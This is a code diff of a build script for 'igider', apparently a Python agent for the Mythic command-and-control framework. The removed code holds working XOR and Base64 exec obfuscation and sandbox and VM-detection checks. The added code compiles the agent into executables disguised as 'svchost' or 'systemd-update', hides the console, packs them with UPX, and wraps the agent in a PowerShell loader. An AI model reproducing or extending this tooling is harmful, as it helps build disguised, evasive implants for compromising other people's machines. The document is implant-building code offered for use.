@@ -1,7 +1,6 @@
 from mythic_container.PayloadBuilder import *
 from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
-
 import asyncio
 import pathlib
 import os
@@ -12,15 +11,15 @@ import json
 import random
 import string
 import logging
-import subprocess
-import shutil
 from typing import Dict, Any, List, Optional
 from itertools import cycle
 import datetime
+import textwrap
+
 
 class Igider(PayloadType):
     name = "igider"
-    file_extension = "exe"  # Changed default extension to exe
+    file_extension = "py"
     author = "@med"
     supported_os = [
         SupportedOS.Windows, SupportedOS.Linux, SupportedOS.MacOS
@@ -28,51 +27,16 @@ class Igider(PayloadType):
     wrapper = False
     wrapped_payloads = ["pickle_wrapper"]
     mythic_encrypts = True
-    note = "Production-ready Python agent with advanced obfuscation and encryption features, now supporting EXE generation"
+    note = "Production-ready Python agent with advanced obfuscation and encryption features"
     supports_dynamic_loading = True
     
     build_parameters = [
         BuildParameter(
             name="output",
             parameter_type=BuildParameterType.ChooseOne,
-            description="Choose output format",
-            choices=["py", "exe", "base64", "py_compressed", "one_liner"],
-            default_value="exe"
-        ),
-        BuildParameter(
-            name="exe_options",
-            parameter_type=BuildParameterType.ChooseMultiple,
-            description="EXE compilation options (only for exe output)",
-            choices=["--onefile", "--noconsole", "--strip", "--upx"],
-            default_value=["--onefile", "--noconsole"]
-        ),
-        BuildParameter(
-            name="exe_icon",
-            parameter_type=BuildParameterType.String,
-            description="Path to icon file for EXE (optional)",
-            default_value="",
-            required=False
-        ),
-        BuildParameter(
-            name="exe_name",
-            parameter_type=BuildParameterType.String,
-            description="Name for the generated EXE file",
-            default_value="application",
-            required=False
-        ),
-        BuildParameter(
-            name="cryptography_method",
-            parameter_type=BuildParameterType.ChooseOne,
-            description="Select crypto implementation method",
-            choices=["manual", "cryptography_lib", "pycryptodome"],
-            default_value="manual"
-        ),
-        BuildParameter(
-            name="obfuscation_level",
-            parameter_type=BuildParameterType.ChooseOne,
-            description="Level of code obfuscation to apply",
-            choices=["none", "basic", "advanced"],
-            default_value="basic"
+            description="How the final payload should be structured for execution",
+            choices=["py","exe_windows", "elf_linux", "powershell_reflective"],
+            default_value="py"
         ),
         BuildParameter(
             name="https_check",
@@ -80,13 +44,6 @@ class Igider(PayloadType):
             description="Verify HTTPS certificate (if HTTP, leave yes)",
             choices=["Yes", "No"],
             default_value="Yes"
-        ),
-        BuildParameter(
-            name="exe_hidden_imports",
-            parameter_type=BuildParameterType.String,
-            description="Additional hidden imports for PyInstaller (comma-separated)",
-            default_value="",
-            required=False
         )
     ]
     
@@ -111,8 +68,6 @@ class Igider(PayloadType):
         BuildStep(step_name="Initializing Build", step_description="Setting up the build environment"),
         BuildStep(step_name="Gathering Components", step_description="Collecting agent code modules"),
         BuildStep(step_name="Configuring Agent", step_description="Applying configuration parameters"),
-        BuildStep(step_name="Applying Obfuscation", step_description="Implementing obfuscation techniques"),
-        BuildStep(step_name="Compiling EXE", step_description="Compiling Python code to executable"),
         BuildStep(step_name="Finalizing Payload", step_description="Preparing final output format")
     ]
 
@@ -161,457 +116,203 @@ class Igider(PayloadType):
             elif value is not None:
                 code = code.replace(key, str(value))
         return code
+    
+    def _create_pyinstaller_spec(self, code: str, target_os: str) -> str:
+        """Generate PyInstaller spec file for executable creation."""
+        spec_content = textwrap.dedent(f"""
+            # -*- mode: python ; coding: utf-8 -*-
 
-    def _generate_random_identifier(self, length: int = 8) -> str:
-        """Generate a random string for variable names to enhance obfuscation."""
-        return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
+            block_cipher = None
 
-    def _basic_obfuscate(self, code: str) -> str:
-        """Apply basic XOR + Base64 obfuscation."""
-        key = hashlib.md5(os.urandom(128)).hexdigest().encode()
-        encrypted_content = ''.join(chr(c^k) for c,k in zip(code.encode(), cycle(key))).encode()
-        b64_enc_content = base64.b64encode(encrypted_content)
-        xor_func = "chr(c^k)"
-        
-        # Use random variable names
-        var_b64 = self._generate_random_identifier()
-        var_key = self._generate_random_identifier()
-        var_iter = self._generate_random_identifier()
-        
-        return f"""import base64, itertools
-{var_b64} = {b64_enc_content}
-{var_key} = {key}
-{var_iter} = itertools.cycle({var_key})
-exec(''.join({xor_func} for c,k in zip(base64.b64decode({var_b64}), {var_iter})).encode())
-"""
+            a = Analysis(
+                ['main.py'],
+                pathex=[],
+                binaries=[],
+                datas=[],
+                hiddenimports=['urllib.request', 'urllib.parse', 'ssl', 'json', 'base64', 'threading', 'time'],
+                hookspath=[],
+                hooksconfig={{}},
+                runtime_hooks=[],
+                excludes=[],
+                win_no_prefer_redirects=False,
+                win_private_assemblies=False,
+                cipher=block_cipher,
+                noarchive=False,
+            )
 
-    def _advanced_obfuscate(self, code: str) -> str:
-        """Apply more advanced obfuscation with multi-layer encryption and junk code."""
-        # First layer: XOR with a random key
-        key1 = hashlib.md5(os.urandom(64)).hexdigest().encode()
-        layer1 = ''.join(chr(c^k) for c,k in zip(code.encode(), cycle(key1)))
-        
-        # Second layer: Rotate bytes by a random amount
-        rotation = random.randint(1, 255)
-        layer2 = ''.join(chr((ord(c) + rotation) % 256) for c in layer1)
-        
-        # Third layer: Base64 encode
-        encoded = base64.b64encode(layer2.encode())
-        
-        # Generate random variable names
-        var_data = self._generate_random_identifier()
-        var_key = self._generate_random_identifier()
-        var_rot = self._generate_random_identifier()
-        var_result = self._generate_random_identifier()
-        var_char = self._generate_random_identifier()
-        var_k = self._generate_random_identifier()
-        var_c = self._generate_random_identifier()
-        
-        # Add some junk functions that never get called
-        junk1_name = self._generate_random_identifier()
-        junk2_name = self._generate_random_identifier()
-        
-        # Build decoder with randomized variable names
-        decoder = f"""
-import base64, itertools, sys, random
+            pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)
 
-def {junk1_name}():
-    return [random.randint(1, 100) for _ in range(10)]
+            exe = EXE(
+                pyz,
+                a.scripts,
+                a.binaries,
+                a.zipfiles,
+                a.datas,
+                [],
+                name='{"svchost" if target_os == "windows" else "systemd-update"}',
+                debug=False,
+                bootloader_ignore_signals=False,
+                strip=False,
+                upx=True,
+                upx_exclude=[],
+                runtime_tmpdir=None,
+                console={'False' if target_os == "windows" else 'True'},
+                disable_windowed_traceback=False,
+                argv_emulation=False,
+                target_arch=None,
+                codesign_identity=None,
+                entitlements_file=None,
+                {'icon="icon.ico",' if target_os == "windows" else ''}
+            )
+        """)
+        return spec_content
 
-{var_data} = {encoded}
-{var_key} = {key1}
-{var_rot} = {rotation}
 
-def {junk2_name}(x):
-    return ''.join(chr((ord(c) + 13) % 256) for c in x)
+    def _create_powershell_loader(self, python_code: str) -> str:
+        """Create PowerShell reflective loader for Python agent."""
+        # Base64 encode the Python code
+        encoded_code = base64.b64encode(python_code.encode()).decode()
+        
+        powershell_loader = f'''
+    # PowerShell Reflective Python Loader
+    $pythonCode = @"
+    {python_code}
+    "@
 
-{var_result} = ''
-for {var_c}, {var_k} in zip(
-    ''.join(chr((ord({var_char}) - {var_rot}) % 256) for {var_char} in base64.b64decode({var_data}).decode()),
-    itertools.cycle({var_key})
-):
-    {var_result} += chr(ord({var_c}) ^ {var_k})
+    # Check for Python installation
+    $pythonPaths = @(
+        "$env:LOCALAPPDATA\\Programs\\Python\\*\\python.exe",
+        "$env:PROGRAMFILES\\Python*\\python.exe",
+        "$env:PROGRAMFILES(X86)\\Python*\\python.exe",
+        "python.exe"
+    )
 
-exec({var_result})
-"""
-        return decoder
+    $pythonExe = $null
+    foreach ($path in $pythonPaths) {{
+        try {{
+            $resolved = Get-Command $path -ErrorAction SilentlyContinue
+            if ($resolved) {{
+                $pythonExe = $resolved.Source
+                break
+            }}
+        }} catch {{}}
+    }}
 
-    def _compress_code(self, code: str) -> str:
-        """Compress the code using zlib for smaller payloads."""
-        import zlib
-        compressed = zlib.compress(code.encode(), level=9)
-        compressed_b64 = base64.b64encode(compressed)
+    if (-not $pythonExe) {{
+        # Fallback: Try to download and run portable Python or use IronPython
+        Write-Host "Python not found, attempting alternative execution..."
         
-        return f"""import base64, zlib
-exec(zlib.decompress(base64.b64decode({compressed_b64})))
-"""
+        # Alternative 1: Use built-in .NET to execute Python-like logic
+        Add-Type -AssemblyName System.Net.Http
+        
+        # Alternative 2: Convert critical parts to PowerShell
+        # This would require translating the Python agent logic
+        exit 1
+    }}
 
-    def _create_one_liner(self, code: str) -> str:
-        """Convert the payload to a one-liner for command line execution."""
-        import re
-        import textwrap
-        
-        # Remove comments and docstrings
-        code = re.sub(r'#.*$', '', code, flags=re.MULTILINE)
-        code = re.sub(r'""".*?"""', '', code, flags=re.DOTALL)
-        code = re.sub(r"'''.*?'''", '', code, flags=re.DOTALL)
-        
-        # Normalize whitespace and indentations
-        lines = []
-        indent_stack = [0]
-        
-        for line in code.split('\n'):
-            line = line.rstrip()
-            if not line.strip():
-                continue
-                
-            # Get current indentation level
-            current_indent = len(line) - len(line.lstrip())
-            
-            # Handle indentation changes
-            if current_indent > indent_stack[-1]:
-                lines.append('__INDENT__')
-                indent_stack.append(current_indent)
-            elif current_indent < indent_stack[-1]:
-                while current_indent < indent_stack[-1]:
-                    lines.append('__DEDENT__')
-                    indent_stack.pop()
-                if current_indent != indent_stack[-1]:
-                    raise ValueError("Indentation mismatch")
-                    
-            # Add the actual code line
-            stripped_line = line.strip()
-            if stripped_line.endswith(':'):
-                stripped_line = stripped_line[:-1]
-            lines.append(stripped_line)
-        
-        # Join with semicolons and handle indentation markers
-        one_liner = []
-        indent_level = 0
-        
-        for line in lines:
-            if line == '__INDENT__':
-                indent_level += 1
-            elif line == '__DEDENT__':
-                indent_level -= 1
-            else:
-                one_liner.append(line)
-        
-        # Final processing
-        result = ';'.join(one_liner)
-        
-        # Clean up syntax
-        result = re.sub(r';{2,}', ';', result)  # Remove duplicate semicolons
-        result = re.sub(r';\s*(?=[)\]}]|$)', '', result)  # Remove semicolons before closing brackets
-        
-        # Fix control structures
-        result = re.sub(r'(if|while|for|def|class|try|except|finally|else|elif)\s*\(', r'\1 ', result)
-        
-        return result
+    # Execute Python code in memory
+    $tempFile = [System.IO.Path]::GetTempFileName() + ".py"
+    $pythonCode | Out-File -FilePath $tempFile -Encoding UTF8
 
-    def _add_evasion_features(self, code: str) -> str:
-        """Add anti-analysis and VM detection capabilities with robust error handling."""
-        evasion_code = []
-         # 1. Add kill date check if specified
+    try {{
+        & $pythonExe $tempFile
+    }} finally {{
+        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
+    }}
+    '''
+        return powershell_loader
+
+    async def _build_executable(self, code: str, target_os: str) -> bytes:
+        """Build executable using PyInstaller."""
+        import tempfile
+        import subprocess
+        import shutil
+        import sys
+        
+        # Check if PyInstaller is available
         try:
-            kill_date = self.c2info[0].get_parameters_dict().get("killdate", "").strip()
-            if kill_date:
-                try:
-                    # Validate date format
-                    datetime.datetime.strptime(kill_date, "%Y-%m-%d")
-                    evasion_code.append(f"""
-import datetime
-if datetime.datetime.now() > datetime.datetime.strptime("{kill_date}", "%Y-%m-%d"):
-    import sys
-    sys.exit(0)
-""")
-                except ValueError as e:
-                    self.logger.warning(f"Invalid killdate format (should be YYYY-MM-DD): {e}")
-        except (IndexError, AttributeError, TypeError) as e:
-            self.logger.debug(f"Could not retrieve kill_date: {e}")
-
-    # 2. Add platform-agnostic evasion checks
-        evasion_code.append("""
-def check_environment():
-    import os
-    import sys
-    import socket
-    import platform
-    import subprocess
-    
-    # Generic suspicious indicators
-    suspicious_indicators = {
-        'hostnames': ['sandbox', 'analysis', 'malware', 'cuckoo', 'vm', 'vbox', 'virtual'],
-        'users': ['user', 'sandbox', 'vmuser'],
-        'processes': ['vmtoolsd', 'vmwaretray', 'vboxservice']
-    }
-    
-    # Check hostname
-    try:
-        hostname = socket.gethostname().lower()
-        if any(name in hostname for name in suspicious_indicators['hostnames']):
-            return False
-    except:
-        pass
-    
-    # Check username
-    try:
-        username = os.getenv("USER", "").lower()
-        if any(user in username for user in suspicious_indicators['users']):
-            return False
-    except:
-        pass
-    
-    # Platform-specific checks
-    try:
-        if platform.system().lower() == 'windows':
-            import ctypes
-            # Check disk size (Windows)
+            subprocess.run(["pyinstaller", "--version"], capture_output=True, check=True)
+        except (subprocess.CalledProcessError, FileNotFoundError):
+            raise Exception("PyInstaller is not installed or not available in PATH")
+        
+        with tempfile.TemporaryDirectory() as temp_dir:
+            # Create main Python file
+            main_py = os.path.join(temp_dir, "main.py")
+            with open(main_py, "w") as f:
+                f.write(code)
+            
+            # Create spec file
+            spec_content = self._create_pyinstaller_spec(code, target_os)
+            spec_file = os.path.join(temp_dir, "build.spec")
+            with open(spec_file, "w") as f:
+                f.write(spec_content)
+            
             try:
-                free_bytes = ctypes.c_ulonglong(0)
-                ctypes.windll.kernel32.GetDiskFreeSpaceExW(
-                    ctypes.c_wchar_p('C:\\\\'), 
-                    None, 
-                    None, 
-                    ctypes.pointer(free_bytes)
+                # Run PyInstaller with proper arguments
+                cmd = [
+                    "pyinstaller", 
+                    spec_file
+                ]
+                
+                self.logger.info(f"Running PyInstaller: {' '.join(cmd)}")
+                result = subprocess.run(
+                    cmd, 
+                    capture_output=True, 
+                    text=True, 
+                    cwd=temp_dir,
+                    timeout=300  # 5 minute timeout
                 )
-                if free_bytes.value < 21474836480:  # 20 GB
-                    return False
-            except:
-                pass
-            
-            # Check for common VM processes (Windows)
-            try:
-                import wmi
-                c = wmi.WMI()
-                for process in c.Win32_Process():
-                    if process.Name.lower() in suspicious_indicators['processes']:
-                        return False
-            except:
-                pass
                 
-        else:  # Linux/Mac
-            import shutil
-            # Check disk size
-            try:
-                if shutil.disk_usage("/").free < 21474836480:  # 20 GB
-                    return False
-            except:
-                pass
-            
-            # Check for VM-specific processes (Linux/Mac)
-            try:
-                ps = subprocess.Popen(['ps', '-aux'], stdout=subprocess.PIPE)
-                output = subprocess.check_output(['grep', '-i'] + suspicious_indicators['processes'], stdin=ps.stdout)
-                if output:
-                    return False
-            except:
-                pass
+                if result.returncode != 0:
+                    self.logger.error(f"PyInstaller stdout: {result.stdout}")
+                    self.logger.error(f"PyInstaller stderr: {result.stderr}")
+                    raise Exception(f"PyInstaller failed with return code {result.returncode}: {result.stderr}")
                 
-    except Exception as e:
-        # If any checks fail, assume we're in a good environment
-        pass
-    
-    return True
-
-# Execute evasion checks
-# if not check_environment():
-#     import sys
-#     sys.exit(0)
-""")
-    
-    # Combine all evasion code and prepend to the original code
-        return "\n".join(evasion_code) + "\n" + code
-
-    def _check_pyinstaller_availability(self) -> bool:
-        """Check if PyInstaller is available in the system."""
-        try:
-            result = subprocess.run(['pyinstaller', '--version'], 
-                                  capture_output=True, text=True, timeout=10)
-            return result.returncode == 0
-        except (subprocess.TimeoutExpired, FileNotFoundError):
-            return False
-
-    def _install_pyinstaller(self) -> bool:
-        """Install PyInstaller if not available."""
-        try:
-            self.logger.info("Installing PyInstaller...")
-            result = subprocess.run(['pip', 'install', 'pyinstaller'], 
-                                  capture_output=True, text=True, timeout=120)
-            return result.returncode == 0
-        except (subprocess.TimeoutExpired, FileNotFoundError) as e:
-            self.logger.error(f"Failed to install PyInstaller: {e}")
-            return False
-
-    async def _compile_to_exe(self, python_code: str, temp_dir: str) -> tuple[bool, str, bytes]:
-        """Compile Python code to EXE using PyInstaller."""
-        try:
-            # Check PyInstaller availability
-            if not self._check_pyinstaller_availability():
-                await self.update_build_step("Compiling EXE", "PyInstaller not found, attempting to install...")
-                if not self._install_pyinstaller():
-                    return False, "Failed to install PyInstaller", b""
-
-            # Create temporary Python file
-            exe_name = self.get_parameter("exe_name") or "application"
-            py_file = os.path.join(temp_dir, f"{exe_name}.py")
-            
-            with open(py_file, 'w') as f:
-                f.write(python_code)
-
-            # Build PyInstaller command
-            cmd = ['pyinstaller']
-            
-            # Add user-selected options
-            exe_options = self.get_parameter("exe_options") or []
-            use_onefile = "--onefile" in exe_options
-            
-            for option in exe_options:
-                if option == "--onefile":
-                    cmd.append('--onefile')
-                elif option == "--noconsole":
-                    cmd.append('--windowed')  # Use --windowed instead of --noconsole
-                elif option == "--strip":
-                    cmd.append('--strip')
-                elif option == "--upx":
-                    # Check if UPX is available before using it
-                    try:
-                        subprocess.run(['upx', '--version'], capture_output=True, timeout=5)
-                        cmd.append('--upx-dir=/usr/bin')
-                    except:
-                        await self.update_build_step("Compiling EXE", "UPX not available, skipping compression")
-            
-            # Add icon if specified
-            exe_icon = self.get_parameter("exe_icon")
-            if exe_icon and os.path.exists(exe_icon):
-                cmd.extend(['--icon', exe_icon])
-            
-            # Add hidden imports if specified
-            hidden_imports = self.get_parameter("exe_hidden_imports")
-            if hidden_imports:
-                for imp in hidden_imports.split(','):
-                    imp = imp.strip()
-                    if imp:
-                        cmd.extend(['--hidden-import', imp])
-            
-            # Add common hidden imports for agent functionality
-            common_imports = [
-                'base64', 'json', 'hashlib', 'itertools', 'datetime',
-                'socket', 'ssl', 'urllib', 'urllib.request', 'urllib.parse',
-                'platform', 'subprocess', 'threading', 'time', 'os', 'sys',
-                'zlib', 'random', 'string', 'logging', 'tempfile'
-            ]
-            
-            for imp in common_imports:
-                cmd.extend(['--hidden-import', imp])
-            
-            # Create dist and build directories
-            dist_dir = os.path.join(temp_dir, 'dist')
-            build_dir = os.path.join(temp_dir, 'build')
-            os.makedirs(dist_dir, exist_ok=True)
-            os.makedirs(build_dir, exist_ok=True)
-            
-            # Specify output directory and name
-            cmd.extend(['--distpath', dist_dir])
-            cmd.extend(['--workpath', build_dir])
-            cmd.extend(['--specpath', temp_dir])
-            cmd.extend(['--name', exe_name])
-            
-            # Add cleanup and optimization flags
-            cmd.append('--clean')
-            cmd.append('--noconfirm')
-            
-            # Add the Python file
-            cmd.append(py_file)
-            
-            await self.update_build_step("Compiling EXE", f"Running PyInstaller with command: {' '.join(cmd)}")
-            
-            # Run PyInstaller
-            result = subprocess.run(cmd, cwd=temp_dir, capture_output=True, text=True, timeout=300)
-            
-            # Log PyInstaller output for debugging
-            await self.update_build_step("Compiling EXE", f"PyInstaller STDOUT: {result.stdout}")
-            if result.stderr:
-                await self.update_build_step("Compiling EXE", f"PyInstaller STDERR: {result.stderr}")
-            
-            if result.returncode != 0:
-                error_msg = f"PyInstaller failed with return code {result.returncode}\nSTDOUT: {result.stdout}\nSTDERR: {result.stderr}"
-                await self.update_build_step("Compiling EXE", error_msg, False)
-                return False, error_msg, b""
-            
-            # Find the generated EXE - try multiple possible locations
-            possible_paths = []
-            
-            if use_onefile:
-                # For --onefile, EXE should be directly in dist directory
-                possible_paths.extend([
-                    os.path.join(dist_dir, f"{exe_name}.exe"),
-                    os.path.join(dist_dir, f"{exe_name}"),
-                    os.path.join(temp_dir, f"{exe_name}.exe"),
-                    os.path.join(temp_dir, f"{exe_name}")
-                ])
-            else:
-                # For regular build, EXE should be in subdirectory
-                possible_paths.extend([
-                    os.path.join(dist_dir, exe_name, f"{exe_name}.exe"),
-                    os.path.join(dist_dir, exe_name, f"{exe_name}"),
-                    os.path.join(dist_dir, f"{exe_name}.exe"),
-                    os.path.join(dist_dir, f"{exe_name}")
-                ])
-            
-            exe_path = None
-            for path in possible_paths:
-                if os.path.exists(path):
-                    exe_path = path
-                    break
-            
-            if not exe_path:
-                # List directory contents for debugging
-                debug_info = []
-                for root, dirs, files in os.walk(temp_dir):
-                    for file in files:
-                        full_path = os.path.join(root, file)
-                        rel_path = os.path.relpath(full_path, temp_dir)
-                        debug_info.append(f"  {rel_path}")
+                # Find the generated executable in the correct location
+                exe_name = "svchost.exe" if target_os == "windows" else "systemd-update"
                 
-                error_msg = f"EXE file not found. Searched locations:\n" + "\n".join(f"  {p}" for p in possible_paths)
-                error_msg += f"\n\nDirectory contents:\n" + "\n".join(debug_info)
-                await self.update_build_step("Compiling EXE", error_msg, False)
-                return False, error_msg, b""
-            
-            # Read the EXE file
-            with open(exe_path, 'rb') as f:
-                exe_data = f.read()
-            
-            await self.update_build_step("Compiling EXE", f"Successfully compiled EXE at {exe_path} ({len(exe_data)} bytes)")
-            return True, "EXE compilation successful", exe_data
-            
-        except subprocess.TimeoutExpired:
-            error_msg = "PyInstaller compilation timed out"
-            await self.update_build_step("Compiling EXE", error_msg, False)
-            return False, error_msg, b""
-        except Exception as e:
-            error_msg = f"Error during EXE compilation: {str(e)}"
-            await self.update_build_step("Compiling EXE", error_msg, False)
-            return False, error_msg, b""
-
+                # PyInstaller puts executables in dist/ directory
+                dist_dir = os.path.join(temp_dir, "dist")
+                exe_path = os.path.join(dist_dir, exe_name)
+                
+                if not os.path.exists(exe_path):
+                    # Fallback: look for any executable in dist directory
+                    if os.path.exists(dist_dir):
+                        files = [f for f in os.listdir(dist_dir) if os.path.isfile(os.path.join(dist_dir, f))]
+                        if files:
+                            exe_path = os.path.join(dist_dir, files[0])
+                            self.logger.info(f"Using fallback executable: {exe_path}")
+                        else:
+                            raise Exception(f"No executable found in {dist_dir}")
+                    else:
+                        raise Exception(f"Distribution directory not created: {dist_dir}")
+                
+                if not os.path.exists(exe_path):
+                    raise Exception(f"Executable not found at expected path: {exe_path}")
+                
+                # Read and return the executable
+                with open(exe_path, "rb") as f:
+                    executable_data = f.read()
+                    
+                self.logger.info(f"Successfully built executable of size: {len(executable_data)} bytes")
+                return executable_data
+                    
+            except subprocess.TimeoutExpired:
+                raise Exception("PyInstaller build timed out after 5 minutes")
+            except Exception as e:
+                self.logger.error(f"Executable build failed: {e}")
+                raise Exception(f"Failed to build executable: {str(e)}")
     async def build(self) -> BuildResponse:
         """Build the Igider payload with the specified configuration."""
         resp = BuildResponse(status=BuildStatus.Success)
         build_errors = []
-        temp_dir = None
         
         try:
             # Step 1: Initialize build
             await self.update_build_step("Initializing Build", "Starting build process...")
-            
-            # Create temporary directory for EXE compilation
-            temp_dir = tempfile.mkdtemp(prefix="igider_build_")
-            
             # Step 2: Gather components
             await self.update_build_step("Gathering Components", "Loading agent modules...")
-            
-            # Load base agent code
+                # Load base agent code
             base_agent_path = self.get_file_path(os.path.join(self.agent_code_path, "base_agent"), "base_agent")
             if not base_agent_path:
                 build_errors.append("Base agent code not found")
@@ -622,22 +323,7 @@ def check_environment():
                 
             base_code = self._load_module_content(base_agent_path)
             
-            # Load appropriate crypto module
-            crypto_method = self.get_parameter("cryptography_method")
-            if crypto_method == "cryptography_lib":
-                crypto_path = self.get_file_path(os.path.join(self.agent_code_path, "base_agent"), "crypto_lib")
-            elif crypto_method == "pycryptodome":
-                crypto_path = self.get_file_path(os.path.join(self.agent_code_path, "base_agent"), "pycrypto_lib")
-            else:  # default to manual
-                crypto_path = self.get_file_path(os.path.join(self.agent_code_path, "base_agent"), "manual_crypto")
-                
-            if not crypto_path:
-                build_errors.append(f"Crypto module '{crypto_method}' not found")
-                crypto_code = "# Error loading crypto module"
-            else:
-                crypto_code = self._load_module_content(crypto_path)
-            
-            # Load command modules
+                # Load command modules
             command_code = ""
             for cmd in self.commands.get_commands():
                 command_path = self.get_file_path(self.agent_code_path, cmd)
@@ -649,13 +335,12 @@ def check_environment():
             # Step 3: Configure agent
             await self.update_build_step("Configuring Agent", "Applying agent configuration...")
             
-            # Replace placeholders with actual code/config
-            base_code = base_code.replace("CRYPTO_MODULE_PLACEHOLDER", crypto_code)
+                # Replace placeholders with actual code/config
             base_code = base_code.replace("UUID_HERE", self.uuid)
             base_code = base_code.replace("#COMMANDS_PLACEHOLDER", command_code)
             
             
-            # Process C2 profile configuration
+                # Process C2 profile configuration
             for c2 in self.c2info:
                 profile = c2.get_c2profile()["name"]
                 base_code = self._apply_config_replacements(base_code, c2.get_parameters_dict())
@@ -671,81 +356,56 @@ def check_environment():
             else:
                 base_code = base_code.replace("#CERTSKIP", "")
             
-            # Step 4: Apply obfuscation
-            await self.update_build_step("Applying Obfuscation", "Implementing code obfuscation...")
             
-            # Add evasion features first
-            base_code = self._add_evasion_features(base_code)
             
-            # Apply obfuscation based on selected level
-            obfuscation_level = self.get_parameter("obfuscation_level")
-            if obfuscation_level == "advanced":
-                base_code = self._advanced_obfuscate(base_code)
-                await self.update_build_step("Applying Obfuscation", "Advanced obfuscation applied successfully")
-            elif obfuscation_level == "basic":
-                base_code = self._basic_obfuscate(base_code)
-                await self.update_build_step("Applying Obfuscation", "Basic obfuscation applied successfully")
-            else:  # none
-                await self.update_build_step("Applying Obfuscation", "No obfuscation requested, skipping")
+            # Step 5: Finalize payload format
+            await self.update_build_step("Finalizing Payload", "Preparing output in requested format...")
             
-            # Step 5: Handle EXE compilation or other output formats
             output_format = self.get_parameter("output")
             
-            if output_format == "exe":
-                # Step 5a: Compile to EXE
-                success, message, exe_data = await self._compile_to_exe(base_code, temp_dir)
-                if not success:
+            if output_format == "exe_windows":
+                try:
+                    await self.update_build_step("Finalizing Payload", "Building Windows executable...")
+                    executable_data = await self._build_executable(base_code, "windows")
+                    resp.payload = executable_data
+                    resp.build_message = "Successfully built Windows executable"
+                except Exception as e:
                     resp.set_status(BuildStatus.Error)
-                    resp.build_stderr = message
+                    resp.build_stderr = f"Failed to build Windows executable: {str(e)}"
                     return resp
-                
-                resp.payload = exe_data
-                resp.build_message = f"Successfully built Windows executable ({len(exe_data)} bytes)"
-                # Set proper file extension for EXE
-                self.file_extension = "exe"
-                
-            else:
-                # Step 5b: Finalize other payload formats
-                await self.update_build_step("Finalizing Payload", "Preparing output in requested format...")
-                
-                if output_format == "base64":
-                    resp.payload = base64.b64encode(base_code.encode())
-                    resp.build_message = "Successfully built payload in base64 format"
-                    self.file_extension = "b64"
-                elif output_format == "py_compressed":
-                    compressed_code = self._compress_code(base_code)
-                    resp.payload = compressed_code.encode()
-                    resp.build_message = "Successfully built compressed Python payload"
-                    self.file_extension = "py"
-                elif output_format == "one_liner":
-                    one_liner = self._create_one_liner(base_code)
-                    resp.payload = one_liner.encode()
-                    resp.build_message = "Successfully built one-liner payload"
-                    self.file_extension = "txt"
-                else:  # default to py
-                    resp.payload = base_code.encode()
-                    resp.build_message = "Successfully built Python script payload"
-                    self.file_extension = "py"
+            elif output_format == "elf_linux":
+                try:
+                    await self.update_build_step("Finalizing Payload", "Building Linux executable...")
+                    executable_data = await self._build_executable(base_code, "linux")
+                    resp.payload = executable_data
+                    resp.build_message = "Successfully built Linux executable"
+                except Exception as e:
+                    resp.set_status(BuildStatus.Error)
+                    resp.build_stderr = f"Failed to build Linux executable: {str(e)}"
+                    return resp
+            elif output_format == "powershell_reflective":
+                try:
+                    await self.update_build_step("Finalizing Payload", "Creating PowerShell reflective loader...")
+                    ps_loader = self._create_powershell_loader(base_code)
+                    resp.payload = ps_loader.encode()
+                    resp.build_message = "Successfully built PowerShell reflective loader"
+                except Exception as e:
+                    resp.set_status(BuildStatus.Error)
+                    resp.build_stderr = f"Failed to build PowerShell loader: {str(e)}"
+                    return resp
+            else:  # default to py
+                resp.payload = base_code.encode()
+                resp.build_message = "Successfully built Python script payload"
             
             # Report any non-fatal errors
             if build_errors:
                 resp.build_stderr = "Warnings during build:\n" + "\n".join(build_errors)
             
+
         except Exception as e:
             self.logger.error(f"Build failed: {str(e)}")
             resp.set_status(BuildStatus.Error)
             resp.build_stderr = f"Error building payload: {str(e)}"
-            if output_format == "exe":
-                await self.update_build_step("Compiling EXE", f"Build failed: {str(e)}", False)
-            else:
-                await self.update_build_step("Finalizing Payload", f"Build failed: {str(e)}", False)
-        
-        finally:
-            # Clean up temporary directory
-            if temp_dir and os.path.exists(temp_dir):
-                try:
-                    shutil.rmtree(temp_dir)
-                except Exception as e:
-                    self.logger.warning(f"Failed to clean up temp directory: {e}")
+            await self.update_build_step("Finalizing Payload", f"Build failed: {str(e)}", False)
             
         return resp
